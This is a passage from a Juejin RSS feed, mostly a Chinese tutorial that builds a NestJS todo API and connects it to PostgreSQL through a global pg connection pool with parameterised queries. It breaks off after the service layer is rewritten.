<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchuyler2025%2Fvideo-player-note" target="_blank" title="https://github.com/Schuyler2025/video-player-note" ref="nofollow noopener noreferrer">github.com/Schuyler202…</a></p>
<p>如果觉得对你有帮助，点个赞支持一下吧！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零上手 NestJS + PostgreSQL：打造类型安全、模块化的企业级后端服务]]></title>    <link>https://juejin.cn/post/7596905015367106560</link>    <guid>https://juejin.cn/post/7596905015367106560</guid>    <pubDate>2026-01-19T14:42:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905015367106560" data-draft-id="7596869784538742784" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 从零上手 NestJS + PostgreSQL：打造类型安全、模块化的企业级后端服务"/> <meta itemprop="keywords" content="后端,NestJS,TypeScript"/> <meta itemprop="datePublished" content="2026-01-19T14:42:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="栀秋666"/> <meta itemprop="url" content="https://juejin.cn/user/2566698322650307"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             从零上手 NestJS + PostgreSQL：打造类型安全、模块化的企业级后端服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2566698322650307/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    栀秋666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:42:15.000Z" title="Mon Jan 19 2026 14:42:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在 Node.js 生态中，Express 虽灵活但易“烂尾”——随着项目膨胀，代码逐渐变成“意大利面条”。而 <strong>NestJS</strong> 的出现，正是为了解决这一痛点。</p>
<p>它基于 TypeScript 构建，融合了 Angular 的依赖注入与模块化思想，提供了一套<strong>企业级的开发范式</strong>：结构清晰、类型安全、易于维护和扩展。本文将带你：</p>
<p>✅ 从零初始化项目<br/>
✅ 深入理解核心三要素（Module/Controller/Service）<br/>
✅ 快速集成 PostgreSQL 实现持久化<br/>
✅ 封装数据库连接并保障安全性<br/>
✅ 掌握关键语法糖与工程化技巧</p>
<p>全程高能，无废话，助你快速写出“别人看了都说专业”的后端代码！</p>
<hr/>
<h3 data-id="heading-1">一、环境准备 &amp; 初始化项目</h3>
<p>确保已安装 Node.js（建议 v18+ LTS），然后全局安装 NestJS CLI：</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g @nestjs/cli
</code></pre>
<p>创建项目：</p>
<pre><code class="hljs language-bash" lang="bash">nest new nestjs-pg-demo
</code></pre>
<p>选择 <code>npm</code> 或你喜欢的包管理器。CLI 自动生成标准结构：</p>
<pre><code class="hljs language-ruby" lang="ruby">src/
├── main.ts          <span class="hljs-comment"># 入口文件</span>
├── app.<span class="hljs-keyword">module</span>.ts    <span class="hljs-comment"># 根模块</span>
├── app.controller.ts
└── app.service.ts
</code></pre>
<p>启动开发服务器：</p>
<pre><code class="hljs language-bash" lang="bash">npm run start:dev
</code></pre>
<p>访问 <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a> 看到 “Hello World” 表示成功！</p>
<p>💡 <strong>小知识</strong>：Nest 默认使用 Express 作为底层 HTTP 引擎，性能足够；若追求极致性能可切换为 Fastify（通过 <code>@nestjs/platform-fastify</code>）。</p>
<hr/>
<h3 data-id="heading-2">二、NestJS 三大核心概念详解（必懂！）</h3>
<p>NestJS 遵循“关注点分离”，三大组件各司其职：</p>

























<table><thead><tr><th>组件</th><th>职责</th><th>类比前端</th></tr></thead><tbody><tr><td>Module</td><td>功能模块容器，组织代码单元</td><td>Vue 中的模块划分</td></tr><tr><td>Controller</td><td>处理 HTTP 请求，定义路由</td><td>路由控制器</td></tr><tr><td>Service</td><td>封装业务逻辑，不处理请求</td><td>Vuex Store / Service 层</td></tr></tbody></table>
<h4 data-id="heading-3">✅ 使用 CLI 快速生成 Todo 模块</h4>
<p>我们来做一个简单的 <code>todos</code> CRUD 功能：</p>
<pre><code class="hljs language-bash" lang="bash">nest g module todos      <span class="hljs-comment"># 生成模块</span>
nest g controller todos --no-spec   <span class="hljs-comment"># 控制器（跳过测试）</span>
nest g service todos --no-spec      <span class="hljs-comment"># 服务</span>
</code></pre>
<p>自动生成的 <code>todos.module.ts</code> 如下：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosController</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos.controller'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos.service'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">TodosController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">TodosService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosModule</span> {}
</code></pre>
<p>记得在 <code>AppModule</code> 中导入它：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/app.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppController</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.controller'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.service'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos/todos.module'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [<span class="hljs-title class_">TodosModule</span>], <span class="hljs-comment">// ✅ 导入功能模块</span>
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">AppController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">AppService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppModule</span> {}
</code></pre>
<p>📌 <strong>重点理解</strong>：</p>
<ul>
<li><code>@Module()</code> 装饰器是整个应用的“组装器”</li>
<li><code>imports</code>: 引入其他模块</li>
<li><code>controllers</code>: 当前模块暴露的路由</li>
<li><code>providers</code>: 可被注入的服务（支持 DI）</li>
</ul>
<hr/>
<h3 data-id="heading-4">三、先做内存版 CRUD —— 快速验证流程</h3>
<p>为了先跑通逻辑，我们先用数组模拟数据存储。</p>
<h4 data-id="heading-5">1. 定义接口 &amp; 创建 Service</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosService</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">todos</span>: <span class="hljs-title class_">Todo</span>[] = [{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'学习 NestJS'</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> }];
  <span class="hljs-keyword">private</span> idCounter = <span class="hljs-number">2</span>;

  <span class="hljs-title function_">findAll</span>(): <span class="hljs-title class_">Todo</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>;
  }

  <span class="hljs-title function_">create</span>(<span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Todo</span> {
    <span class="hljs-keyword">const</span> todo = { <span class="hljs-attr">id</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">idCounter</span>++, title, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">push</span>(todo);
    <span class="hljs-keyword">return</span> todo;
  }

  <span class="hljs-title function_">delete</span>(<span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">id</span> === id);
    <span class="hljs-keyword">if</span> (index === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
}
</code></pre>
<p>📌 <code>@Injectable()</code> 是什么？</p>
<blockquote>
<p>它标记这个类可以被 Nest 的依赖注入系统管理。即使没显式写 <code>@Injectable()</code>，只要被模块引用也能工作，但加上更规范，尤其当你需要用到注入其他服务时。</p>
</blockquote>
<hr/>
<h4 data-id="heading-6">2. 编写 Controller 接收请求</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span>, <span class="hljs-title class_">Post</span>, <span class="hljs-title class_">Body</span>, <span class="hljs-title class_">Delete</span>, <span class="hljs-title class_">Param</span>, <span class="hljs-title class_">ParseIntPipe</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosService</span>, <span class="hljs-title class_">Todo</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos.service'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'todos'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> todosService: TodosService</span>) {}

  <span class="hljs-meta">@Get</span>()
  <span class="hljs-title function_">getAll</span>(): <span class="hljs-title class_">Todo</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todosService</span>.<span class="hljs-title function_">findAll</span>();
  }

  <span class="hljs-meta">@Post</span>()
  <span class="hljs-title function_">add</span>(<span class="hljs-meta">@Body</span>(<span class="hljs-string">'title'</span>) <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Todo</span> {
    <span class="hljs-keyword">if</span> (!title?.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'标题不能为空'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todosService</span>.<span class="hljs-title function_">create</span>(title);
  }

  <span class="hljs-meta">@Delete</span>(<span class="hljs-string">':id'</span>)
  <span class="hljs-title function_">remove</span>(<span class="hljs-params"><span class="hljs-meta">@Param</span>(<span class="hljs-string">'id'</span>, ParseIntPipe) id: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">todosService</span>.<span class="hljs-title function_">delete</span>(id) };
  }
}
</code></pre>
<p>🎯 关键语法解析：</p>





























<table><thead><tr><th>装饰器</th><th>作用</th></tr></thead><tbody><tr><td><code>@Controller('todos')</code></td><td>定义基础路径 <code>/todos</code></td></tr><tr><td><code>@Get()</code> → <code>GET /todos</code></td><td>获取列表</td></tr><tr><td><code>@Post()</code> → <code>POST /todos</code></td><td>添加任务</td></tr><tr><td><code>@Body('title')</code></td><td>提取 JSON 请求体中的字段</td></tr><tr><td><code>@Param('id', ParseIntPipe)</code></td><td>自动将 URL 参数转成整数，失败抛错</td></tr></tbody></table>
<p>🧠 <strong>ParseIntPipe 干了啥？</strong></p>
<blockquote>
<p>原生 Node 中 <code>req.params.id</code> 是字符串 <code>'1'</code>，你需要手动 <code>parseInt</code>。而 <code>ParseIntPipe</code> 会自动转换，并在校验失败时返回 400 错误，提升健壮性！</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">四、接入 PostgreSQL：告别内存，走向生产</h3>
<p>现在我们将数据持久化到 PostgreSQL。</p>
<h4 data-id="heading-8">1. 安装依赖</h4>
<pre><code class="hljs language-bash" lang="bash">npm install pg dotenv
npm install -D @types/pg
</code></pre>
<h4 data-id="heading-9">2. 配置环境变量 <code>.env</code></h4>
<pre><code class="hljs language-env" lang="env">DB_HOST=localhost
DB_PORT=5432
DB_USER=your_user
DB_PASSWORD=your_password
DB_NAME=nest_demo
PORT=3000
</code></pre>
<p>在 <code>main.ts</code> 开头加载配置：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/main.ts</span>
<span class="hljs-keyword">import</span> { config } <span class="hljs-keyword">from</span> <span class="hljs-string">'dotenv'</span>;
<span class="hljs-title function_">config</span>(); <span class="hljs-comment">// 加载 .env 文件</span>

<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NestFactory</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/core'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.module'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AppModule</span>);
  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>);
}
<span class="hljs-title function_">bootstrap</span>();
</code></pre>
<hr/>
<h4 data-id="heading-10">3. 封装 DatabaseModule（推荐做法）</h4>
<p>我们要把数据库连接做成一个<strong>全局共享的连接池</strong>，避免重复创建。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/database/database.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Global</span>, <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Pool</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'pg'</span>;

<span class="hljs-meta">@Global</span>() <span class="hljs-comment">// 🌍 标记为全局模块，其他模块无需再 import</span>
<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">providers</span>: [
    {
      <span class="hljs-attr">provide</span>: <span class="hljs-string">'PG_CONNECTION'</span>, <span class="hljs-comment">// 自定义令牌名</span>
      <span class="hljs-attr">useValue</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pool</span>({
        <span class="hljs-attr">user</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_USER</span>,
        <span class="hljs-attr">host</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_HOST</span>,
        <span class="hljs-attr">database</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_NAME</span>,
        <span class="hljs-attr">password</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_PASSWORD</span>,
        <span class="hljs-attr">port</span>: <span class="hljs-built_in">parseInt</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_PORT</span>, <span class="hljs-number">10</span>),
      }),
    },
  ],
  <span class="hljs-attr">exports</span>: [<span class="hljs-string">'PG_CONNECTION'</span>], <span class="hljs-comment">// ⚠️ 让外部能拿到这个连接</span>
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseModule</span> {}
</code></pre>
<p>📌 <strong>为什么用 <code>@Global()</code>？</strong></p>
<blockquote>
<p>如果你不加，每个需要数据库的模块都得手动导入 <code>DatabaseModule</code>，很麻烦。加上后只需一次注册，处处可用。</p>
</blockquote>
<p>别忘了在 <code>AppModule</code> 中引入一次：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/app.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">DatabaseModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./database/database.module'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [<span class="hljs-title class_">DatabaseModule</span>, <span class="hljs-title class_">TodosModule</span>],
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">AppController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">AppService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppModule</span> {}
</code></pre>
<hr/>
<h4 data-id="heading-11">4. 改造 TodosService 使用 PG 查询</h4>
<p>先在数据库中建表：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> todos (
  id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
  title <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  completed <span class="hljs-type">BOOLEAN</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">false</span>
);
</code></pre>
<p>然后改造服务层：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span>, <span class="hljs-title class_">Inject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-meta">@Inject</span>(<span class="hljs-string">'PG_CONNECTION'</span>) <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> db: Pool</span>) {}

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">findAll</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(<span class="hljs-string">'SELECT * FROM todos ORDER BY id'</span>);
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">rows</span>; <span class="hljs-comment">// 返回结果数组</span>
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">title: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(
      <span class="hljs-string">'INSERT INTO todos (title) VALUES ($1) RETURNING *'</span>,
      [title]
    );
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">rows</span>[<span class="hljs-number">0</span>];
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(<span class="hljs-string">'DELETE FROM todos WHERE id = $1'</span>, [id]);
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">rowCount</span> &gt; <span class="hljs-number">0</span>; <span class="hljs-comment">// 是否有行被删除</span>
  }
}
</code></pre>
